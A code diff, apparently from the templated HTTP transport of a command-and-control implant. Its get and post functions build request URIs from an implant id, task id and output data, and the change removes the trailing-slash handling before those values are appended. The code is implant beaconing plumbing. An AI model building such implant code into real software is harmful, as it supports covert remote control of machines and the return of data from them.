@@ -89,11 +89,7 @@ nlohmann::json get(std::string implant_uuid) {
     [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "uri-append" %]
 
-    //TODO: check if `/` at last char, if not, add one.
-    if (!uri.empty() && uri.back() != '/') {
-        uri.push_back('/');
-    }
-    //could use append from transform here too
+    //could use append from transform here too 
     uri += w_metadata;
     [% endif %]
 
@@ -212,10 +208,6 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     
     [%- if http_post_client_id_terminator == "uri-append" %]
 
-    //TODO: check if `/` at last char, if not, add one.
-    if (!uri.empty() && uri.back() != '/') {
-        uri.push_back('/');
-    }
     //could use append from transform here too
     uri += w_id;
 
@@ -248,10 +240,6 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
 
     [%- if http_post_client_output_terminator == "uri-append" %]
 
-    //TODO: check if `/` at last char, if not, add one.
-    if (!uri.empty() && uri.back() != '/') {
-        uri.push_back('/');
-    }
     //could use append from transform here too
     uri += w_payload;
 
